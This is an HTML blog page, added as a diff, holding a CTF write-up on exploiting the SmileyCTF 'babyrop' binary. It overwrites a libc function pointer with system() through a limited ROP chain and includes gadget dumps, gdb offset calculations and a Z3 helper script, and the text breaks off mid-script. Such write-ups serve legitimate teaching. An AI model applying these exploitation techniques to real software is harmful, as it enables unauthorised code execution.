@@ -1,0 +1,946 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola v0.21.0" />
+  <title>SmileyCTF Babyrop Writeup 2 | Dreamer</title>
+  <meta property="og:site_name" content="Dreamer" />
+  <meta property="og:title" content="SmileyCTF Babyrop Writeup 2" />
+  <meta name="description" content="Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes GOT overwrite with limited rop gadgets" />
+  <meta property="og:description" content="Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes GOT overwrite with limited rop gadgets" />
+  <meta property="og:url" content="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop2/" />
+  <link rel="canonical" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop2/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2025-07-26T00:00:00+00:00" />
+  <meta property="og:image" content="https://ismailbozkurt.github.io/images/SmileyCTF/SmileyCTF-Babyrop-2/smileyCTF_pic.png" />
+  <meta property="og:image:alt" content="Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes GOT overwrite with limited rop gadgets" />
+  <meta property="og:image:width" content="645" />
+  <meta property="og:image:height" content="147" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://ismailbozkurt.github.io/atom.xml" title="Dreamer | Atom" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://ismailbozkurt.github.io/main.min.css?h=2e89f7f30f1019877d14" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://ismailbozkurt.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://ismailbozkurt.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://ismailbozkurt.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://ismailbozkurt.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://ismailbozkurt.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://ismailbozkurt.github.io/files/custom.css">
+
+<!-- HEAD END -->
+
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://ismailbozkurt.github.io/" class="text-2xl font-semibold">Dreamer</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://ismailbozkurt.github.io/elasticlunr.min.js", "https://ismailbozkurt.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/infosec_notes"
+          >Infosec-Notes</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/about"
+          >About</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/n2myself"
+          >Note2Myself</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">SmileyCTF Babyrop Writeup 2</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2025-07-26T00:00:00+00:00">2025-07-26</time><span
+        class="middot"></span><time
+    datetime="PT0H5M0S">5&nbsp;min</time><span
+      class="middot"></span>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://ismailbozkurt.github.io/images/SmileyCTF/SmileyCTF-Babyrop-2/smileyCTF_pic.png"
+      alt="Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes GOT overwrite with limited rop gadgets"
+      width="645"
+      height="147"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop2/#the-game-plan">The Game Plan</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop2/#revisiting-the-gadgets">Revisiting the gadgets</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop2/#libc-harvesting">LIBC Harvesting</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop2/#headache-part">Headache part</a>
+            </li>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop2/#chain-chin-cho">Chain-Chin-Cho</a>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><p>This blog post is about the another way to achieve code execution on <code>SmileyCTF - babyrop challange</code> . After the CTF ended,  encountered strange solution. It makes me wonder. So i decided to re-produce to steps.</p>
+<h2 id="the-game-plan">The Game Plan</h2>
+<p>Let me explain quickly, the <code>vuln</code> binary using <code>print</code> function from <code>libc.so.6</code> . The address 0x404010 . ^address-of-print</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/63d7bce5910a2d478793a53f44079a65.png" alt="63d7bce5910a2d478793a53f44079a65.png" /></p>
+<p>When we looked at the which memory region <code>print</code> function address located in <code>rw</code> region (<strong>.data</strong>).</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/9475169ebea7cf0520a5591149a8ffeb.png" alt="9475169ebea7cf0520a5591149a8ffeb.png" /></p>
+<p>The <code>GOT Table</code> in read-only area but <code>print</code> in <code>.data</code> section.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/b1aaec7d96488891656802b329ca7c90.png" alt="b1aaec7d96488891656802b329ca7c90.png" /></p>
+<p>The <a href="https://ismailbozkurt.github.io/ctf/writeup/2025/07/17/SmileyCTF_Babyrop.html">First Writeup</a> has same idea with the libc-leak, stack pivoting approach with <code>ROP chain</code> . This approach answering this particular question.</p>
+<p><strong><code>What happens if we set address inside of 0x404010 with execve, system or one_gadget without leaking libc</code></strong> .   GOT overwrite essentially.</p>
+<p>Since we have already have <code>libc.so.6</code> file. So the knowledge of offsets already known to us. All we have to find proper way to set address inside of <code>0x404010</code> .</p>
+<p>Sounds like a plan right ? Lets move into it.</p>
+<h3 id="revisiting-the-gadgets">Revisiting the gadgets</h3>
+<p>The challange creator/creators give us these gadgets. This gadgets will have crucial roles for the <code>ROP Chain</code> . ^gadgets-function</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>gef➤  disassemble gadgets 
+</span><span>Dump of assembler code </span><span style="color:#b48ead;">for </span><span>function gadgets</span><span style="background-color:#bf616a;color:#2b303b;">:</span><span>
+</span><span>   </span><span style="color:#d08770;">0x0000000000401176 </span><span>&lt;+</span><span style="color:#d08770;">0</span><span>&gt;:     endbr64
+</span><span>   </span><span style="color:#d08770;">0x000000000040117a </span><span>&lt;+</span><span style="color:#d08770;">4</span><span>&gt;:     push   rbp
+</span><span>   </span><span style="color:#d08770;">0x000000000040117b </span><span>&lt;+</span><span style="color:#d08770;">5</span><span>&gt;:     mov    rbp,rsp
+</span><span>   </span><span style="color:#d08770;">0x000000000040117e </span><span>&lt;+</span><span style="color:#d08770;">8</span><span>&gt;:     pop    rcx
+</span><span>   </span><span style="color:#d08770;">0x000000000040117f </span><span>&lt;+</span><span style="color:#d08770;">9</span><span>&gt;:     ret
+</span><span>   </span><span style="color:#d08770;">0x0000000000401180 </span><span>&lt;+</span><span style="color:#d08770;">10</span><span>&gt;:    nop
+</span><span>   </span><span style="color:#d08770;">0x0000000000401181 </span><span>&lt;+</span><span style="color:#d08770;">11</span><span>&gt;:    pop    rbp
+</span><span>   </span><span style="color:#d08770;">0x0000000000401182 </span><span>&lt;+</span><span style="color:#d08770;">12</span><span>&gt;:    ret
+</span><span>End of assembler dump.
+</span></code></pre>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">ropr</span><span> ./vuln</span><span style="color:#bf616a;"> -j -u 
+</span></code></pre>
+<p>The important gadgets for the plan.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#d08770;">0x00401157</span><span>: add eax, </span><span style="color:#d08770;">0x2ec3</span><span>; add [rbp-</span><span style="color:#d08770;">0x3d</span><span>], ebx; nop; ret;
+</span><span style="color:#d08770;">0x0040115c</span><span>: add [rbp-</span><span style="color:#d08770;">0x3d</span><span>], ebx; nop; ret;
+</span><span style="color:#d08770;">0x0040115b</span><span>: add [rcx], al; pop rbp; ret;
+</span><span style="color:#d08770;">0x00401230</span><span>: add rsp, </span><span style="color:#d08770;">8</span><span>; ret;
+</span><span style="color:#d08770;">0x0040117a</span><span>: push rbp; mov rbp, rsp; pop rcx; ret;
+</span><span style="color:#d08770;">0x0040117b</span><span>: mov rbp, rsp; pop rcx; ret;
+</span><span style="color:#d08770;">0x0040117e</span><span>: pop rcx; ret;
+</span><span style="color:#d08770;">0x00401181</span><span>: pop rbp; ret;
+</span><span style="color:#d08770;">0x00401234</span><span>: ret;
+</span></code></pre>
+<h3 id="libc-harvesting">LIBC Harvesting</h3>
+<p>There are 2 specific gadgets that let us ability to put any value we want. Anything we put on stack these gadgets let us to handle directly.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/67dd8f932a117f348c2fd4bc807c5acb.png" alt="67dd8f932a117f348c2fd4bc807c5acb.png" /></p>
+<p>Another probably the most important one is the <code>0x40115c</code>  If we control <code>ebx</code> register value we control any value inside of <code>$rbp-0x3d</code></p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/d59cc8f546e7467c0dec46bdfd5e247d.png" alt="d59cc8f546e7467c0dec46bdfd5e247d.png" /></p>
+<p>Now imagine^imagination</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>(remote) gef➤  p puts
+</span><span>$</span><span style="color:#d08770;">3 </span><span>= {</span><span style="color:#bf616a;">int </span><span>(const char *)} </span><span style="color:#d08770;">0x7ffff7e32be0 </span><span>&lt;__GI__IO_puts&gt;
+</span><span>(remote) gef➤  p system
+</span><span>$</span><span style="color:#d08770;">4 </span><span>= {</span><span style="color:#bf616a;">int </span><span>(const char *)} </span><span style="color:#d08770;">0x7ffff7e03750 </span><span>&lt;__libc_system&gt;
+</span><span>(remote) gef➤  p puts-system
+</span><span>$</span><span style="color:#d08770;">5 </span><span>= </span><span style="color:#d08770;">0x2f490
+</span><span>(remote) gef➤  p system-puts
+</span><span>$</span><span style="color:#d08770;">6 </span><span>= </span><span style="color:#d08770;">0xfffffffffffd0b70
+</span></code></pre>
+<blockquote>
+<p>rbp : 0x40404d-&gt; the print GOT address at 0x404010 (0x7ffff7e32be0 in my environment)
+ebx : 0xfffffffffffd0b70
+The result inside of 0x404010 -&gt; 0x7ffff7e03750</p>
+</blockquote>
+<p>The end of calculations successfully overwrite the 0x404010 with <code>__libc_system</code> address.
+Nothing easy in life, this gonna be not so easy as well.</p>
+<p>As you realize didn't shared any gadget we can control rbx value. Thats because couldn't find any proper gadget with least cost. I'm saying i couldn't because i am not sure if there is, i didn't recognize.</p>
+<p>Anyway, there is no simple explanation for this, we need to find and calculate <code>pop rbx</code> gadget. The harvesting LIBC was not easy to me, you will see the reason at next steps. So this is our target address. ^e2ee21-addr</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>(remote) gef➤  x/12i </span><span style="color:#d08770;">0x00007ffff7e2ee21
+</span><span>   </span><span style="color:#d08770;">0x7ffff7e2ee21 </span><span>&lt;__parse_one_specmb+</span><span style="color:#d08770;">1057</span><span>&gt;:    add    rsp,</span><span style="color:#d08770;">0x18
+</span><span>   </span><span style="color:#d08770;">0x7ffff7e2ee25 </span><span>&lt;__parse_one_specmb+</span><span style="color:#d08770;">1061</span><span>&gt;:    mov    rax,r14
+</span><span>   </span><span style="color:#d08770;">0x7ffff7e2ee28 </span><span>&lt;__parse_one_specmb+</span><span style="color:#d08770;">1064</span><span>&gt;:    pop    rbx
+</span><span>   </span><span style="color:#d08770;">0x7ffff7e2ee29 </span><span>&lt;__parse_one_specmb+</span><span style="color:#d08770;">1065</span><span>&gt;:    pop    r12
+</span><span>   </span><span style="color:#d08770;">0x7ffff7e2ee2b </span><span>&lt;__parse_one_specmb+</span><span style="color:#d08770;">1067</span><span>&gt;:    pop    r13
+</span><span>   </span><span style="color:#d08770;">0x7ffff7e2ee2d </span><span>&lt;__parse_one_specmb+</span><span style="color:#d08770;">1069</span><span>&gt;:    pop    r14
+</span><span>   </span><span style="color:#d08770;">0x7ffff7e2ee2f </span><span>&lt;__parse_one_specmb+</span><span style="color:#d08770;">1071</span><span>&gt;:    pop    r15
+</span><span>   </span><span style="color:#d08770;">0x7ffff7e2ee31 </span><span>&lt;__parse_one_specmb+</span><span style="color:#d08770;">1073</span><span>&gt;:    pop    rbp
+</span><span>   </span><span style="color:#d08770;">0x7ffff7e2ee32 </span><span>&lt;__parse_one_specmb+</span><span style="color:#d08770;">1074</span><span>&gt;:    ret
+</span></code></pre>
+<p>If everything goes well and execute 0x7ffff7e2ee21 address, the ebx could be anything we want.</p>
+<h3 id="headache-part">Headache part</h3>
+<p>There is one specific problem that gave me so much headache at the start. The gadgets already limited and specific. So the calculations must be precise. What i am saying like this,</p>
+<blockquote>
+<p>eax could be only 0x2ec3 * n -&gt; n the counter</p>
+<blockquote>
+<p>(0x00401157: add eax, 0x2ec3; add [rbp-0x3d], ebx; nop; ret;)</p>
+</blockquote>
+<p>we can only use and add of least significant bit of eax which is al</p>
+<blockquote>
+<p>0x0040115b: add [rcx], al; pop rbp; ret; -&gt; this one costy. Everytime this one cost us 16 bytes. its popping rbp.</p>
+</blockquote>
+<p>Somehow we have to end up with  0x7ffff7e2ee21</p>
+</blockquote>
+<p>I don't know the original PoC creator how calculated this but i developed a lazy script that made me the calculation for each individual byte. The script is not great but it does the job.</p>
+<p>I also have to mention the other problem as you know, stack is not limitless, oversized payload buffer cause the <code>Segmentation Fault!</code> . Even the below one is so close.</p>
+<p>The script</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>z3 </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span style="color:#65737e;"># Define initial state values
+</span><span>initial_eax = </span><span style="color:#d08770;">0x0
+</span><span style="color:#65737e;">#initial_memory_rcx = 0x7ffff7e32be0 # print libc address
+</span><span style="color:#65737e;">#initial_memory_rcx = 0x7ffff7e32b2b # 17 eax, 30 rcx
+</span><span>initial_memory_rcx  = </span><span style="color:#d08770;">0x7ffff7e32b2b
+</span><span>
+</span><span style="color:#65737e;"># Define the target RL byte
+</span><span style="color:#65737e;">#target_rl = 0x2b # Or 0x21 based on your example
+</span><span style="color:#65737e;">#target_rl = 0xa5 # Or 0x21 based on your example
+</span><span>target_rl  = </span><span style="color:#d08770;">0xee
+</span><span style="color:#65737e;"># Global counters for function executions (for Python verification)
+</span><span>executed_functions = []
+</span><span>
+</span><span style="color:#65737e;"># --- Python Helper Functions (as before) ---
+</span><span style="color:#65737e;"># Simulate memory as a dictionary
+</span><span>memory = {}
+</span><span>rcx = </span><span style="color:#d08770;">0x404010
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">add_eax_2ec3</span><span>(</span><span style="color:#bf616a;">eax_val</span><span>: int) -&gt; int:
+</span><span>    </span><span style="color:#b48ead;">global </span><span>executed_functions
+</span><span>    executed_functions.</span><span style="color:#bf616a;">append</span><span>(&quot;</span><span style="color:#a3be8c;">add_eax_2ec3</span><span>&quot;)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>eax_val + </span><span style="color:#d08770;">0x2ec3
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">get_al</span><span>(</span><span style="color:#bf616a;">eax_val</span><span>: int) -&gt; int:
+</span><span>    </span><span style="color:#b48ead;">return </span><span>eax_val &amp; </span><span style="color:#d08770;">0xff
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">add_al_to_rl</span><span>(</span><span style="color:#bf616a;">eax_val</span><span>: int, </span><span style="color:#bf616a;">rcx_addr</span><span>: int):
+</span><span>    </span><span style="color:#b48ead;">global </span><span>executed_functions
+</span><span>    executed_functions.</span><span style="color:#bf616a;">append</span><span>(&quot;</span><span style="color:#a3be8c;">add_al_to_rl</span><span>&quot;)
+</span><span>    </span><span style="color:#b48ead;">if </span><span>rcx_addr not in memory:
+</span><span>        </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Error: Address </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(rcx_addr)}</span><span style="color:#a3be8c;"> not found in memory.</span><span>&quot;)
+</span><span>        </span><span style="color:#b48ead;">return
+</span><span>    al = </span><span style="color:#bf616a;">get_al</span><span>(eax_val)
+</span><span>    current_memory_val = memory[rcx_addr]
+</span><span>    current_rl = current_memory_val &amp; </span><span style="color:#d08770;">0xff
+</span><span>    new_rl = (current_rl + al) &amp; </span><span style="color:#d08770;">0xff
+</span><span>    memory[rcx_addr] = (current_memory_val &amp; ~</span><span style="color:#d08770;">0xff</span><span>) | new_rl
+</span><span>
+</span><span style="color:#65737e;"># --- Z3 Solver Logic (Revised for Multiple AL Adds) ---
+</span><span>s = </span><span style="color:#bf616a;">Optimize</span><span>()
+</span><span>
+</span><span style="color:#65737e;"># Z3 variables
+</span><span>num_eax_adds_bv = </span><span style="color:#bf616a;">BitVec</span><span>(&#39;</span><span style="color:#a3be8c;">num_eax_adds_bv</span><span>&#39;, </span><span style="color:#d08770;">64</span><span>) </span><span style="color:#65737e;"># Number of add_eax_2ec3 calls
+</span><span>num_al_adds_bv = </span><span style="color:#bf616a;">BitVec</span><span>(&#39;</span><span style="color:#a3be8c;">num_al_adds_bv</span><span>&#39;, </span><span style="color:#d08770;">64</span><span>)   </span><span style="color:#65737e;"># Number of add_al_to_rl calls
+</span><span>final_eax_at_loop_start_z3 = </span><span style="color:#bf616a;">BitVec</span><span>(&#39;</span><span style="color:#a3be8c;">final_eax_at_loop_start</span><span>&#39;, </span><span style="color:#d08770;">64</span><span>) </span><span style="color:#65737e;"># eax after all add_eax_2ec3 calls
+</span><span>current_rl_z3 = </span><span style="color:#bf616a;">BitVec</span><span>(&#39;</span><span style="color:#a3be8c;">current_rl</span><span>&#39;, </span><span style="color:#d08770;">8</span><span>)         </span><span style="color:#65737e;"># Initial RL of memory[rcx]
+</span><span>
+</span><span style="color:#65737e;"># Constraints:
+</span><span style="color:#65737e;"># 1. Number of calls must be non-negative
+</span><span>s.</span><span style="color:#bf616a;">add</span><span>(num_eax_adds_bv &gt;= </span><span style="color:#d08770;">0</span><span>)
+</span><span>s.</span><span style="color:#bf616a;">add</span><span>(num_al_adds_bv &gt;= </span><span style="color:#d08770;">0</span><span>) </span><span style="color:#65737e;"># Must call add_al_to_rl at least once to change RL
+</span><span>
+</span><span style="color:#65737e;"># 2. final_eax_at_loop_start_z3 is derived from initial_eax by num_eax_adds_bv calls
+</span><span>s.</span><span style="color:#bf616a;">add</span><span>(final_eax_at_loop_start_z3 == </span><span style="color:#bf616a;">BitVecVal</span><span>(initial_eax, </span><span style="color:#d08770;">64</span><span>) + (num_eax_adds_bv * </span><span style="color:#bf616a;">BitVecVal</span><span>(</span><span style="color:#d08770;">0x2ec3</span><span>, </span><span style="color:#d08770;">64</span><span>)))
+</span><span>
+</span><span style="color:#65737e;"># 3. Initial RL from memory[rcx]
+</span><span>s.</span><span style="color:#bf616a;">add</span><span>(current_rl_z3 == (initial_memory_rcx &amp; </span><span style="color:#d08770;">0xFF</span><span>))
+</span><span>
+</span><span style="color:#65737e;"># 4. Get AL from final_eax_at_loop_start_z3 (this AL is used repeatedly)
+</span><span>al_z3 = </span><span style="color:#bf616a;">Extract</span><span>(</span><span style="color:#d08770;">7</span><span>, </span><span style="color:#d08770;">0</span><span>, final_eax_at_loop_start_z3)
+</span><span>
+</span><span style="color:#65737e;"># 5. Calculate the cumulative sum of AL additions to RL
+</span><span style="color:#65737e;">#    new_rl = (initial_rl + (num_al_adds * al)) &amp; 0xFF
+</span><span>cumulative_al_sum_z3_8bit = </span><span style="color:#bf616a;">Extract</span><span>(</span><span style="color:#d08770;">7</span><span>, </span><span style="color:#d08770;">0</span><span>, (num_al_adds_bv * </span><span style="color:#bf616a;">ZeroExt</span><span>(</span><span style="color:#d08770;">56</span><span>, al_z3)))
+</span><span>
+</span><span style="color:#65737e;"># Now add two 8-bit BitVecs
+</span><span>final_rl_z3 = (current_rl_z3 + cumulative_al_sum_z3_8bit) &amp; </span><span style="color:#d08770;">0xFF
+</span><span>
+</span><span style="color:#65737e;"># 6. The final RL must be the target RL
+</span><span>s.</span><span style="color:#bf616a;">add</span><span>(final_rl_z3 == target_rl)
+</span><span>
+</span><span style="color:#65737e;"># --- Optimization Objective ---
+</span><span style="color:#65737e;"># Minimize the total number of operations, or prioritize one over the other
+</span><span style="color:#65737e;"># Let&#39;s minimize the sum of eax adds and al adds (total steps)
+</span><span>s.</span><span style="color:#bf616a;">minimize</span><span>(num_eax_adds_bv + num_al_adds_bv)
+</span><span style="color:#65737e;"># Or, if you prioritize fewer add_al_to_rl calls:
+</span><span style="color:#65737e;"># s.minimize(num_al_adds_bv)
+</span><span style="color:#65737e;"># s.minimize(num_eax_adds_bv) # Then minimize eax_adds secondary (can chain minimizes)
+</span><span>
+</span><span>
+</span><span style="color:#65737e;"># Find a solution
+</span><span style="color:#b48ead;">if </span><span>s.</span><span style="color:#bf616a;">check</span><span>() == sat:
+</span><span>    model = s.</span><span style="color:#bf616a;">model</span><span>()
+</span><span>    found_num_eax_adds = model[num_eax_adds_bv].</span><span style="color:#bf616a;">as_long</span><span>()
+</span><span>    found_num_al_adds = model[num_al_adds_bv].</span><span style="color:#bf616a;">as_long</span><span>()
+</span><span>    found_final_eax_val_at_loop_start = model[final_eax_at_loop_start_z3].</span><span style="color:#bf616a;">as_long</span><span>()
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Z3 found an OPTIMIZED solution:</span><span>&quot;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">  Minimum &#39;add_eax_2ec3&#39; calls before loop: </span><span>{found_num_eax_adds}&quot;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">  Minimum &#39;add_al_to_rl&#39; calls: </span><span>{found_num_al_adds}&quot;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">  eax value when add_al_to_rl loop starts: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(found_final_eax_val_at_loop_start)}&quot;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">  AL used during loop: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#bf616a;">get_al</span><span>(found_final_eax_val_at_loop_start))}&quot;)
+</span><span>
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># --- Verification and Execution Count ---
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">--- Verification and Execution Count ---</span><span>&quot;)
+</span><span>    
+</span><span>    </span><span style="color:#65737e;"># Reset executed functions list for a clean count during verification
+</span><span>    executed_functions = [] 
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># Set up the memory for verification
+</span><span>    eax_for_verification = initial_eax
+</span><span>    memory[rcx] = initial_memory_rcx
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Initial eax: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(eax_for_verification)}&quot;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Initial memory[</span><span>{</span><span style="color:#96b5b4;">hex</span><span>(rcx)}</span><span style="color:#a3be8c;">] RL: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(memory[rcx] &amp; </span><span style="color:#d08770;">0xFF</span><span>)}&quot;)
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># Execute add_eax_2ec3 the found number of times
+</span><span>    </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(found_num_eax_adds):
+</span><span>        eax_for_verification = </span><span style="color:#bf616a;">add_eax_2ec3</span><span>(eax_for_verification)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">eax after </span><span>{found_num_eax_adds}</span><span style="color:#a3be8c;"> &#39;add_eax_2ec3&#39; calls: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(eax_for_verification)}&quot;)
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">AL from this eax: </span><span>{</span><span style="color:#96b5b4;">hex</span><span>(</span><span style="color:#bf616a;">get_al</span><span>(eax_for_verification))}&quot;)
+</span><span>
+</span><span>    </span><span style="color:#65737e;"># Execute add_al_to_rl the found number of times
+</span><span>    </span><span style="color:#b48ead;">for </span><span style="color:#bf616a;">_ </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(found_num_al_adds):
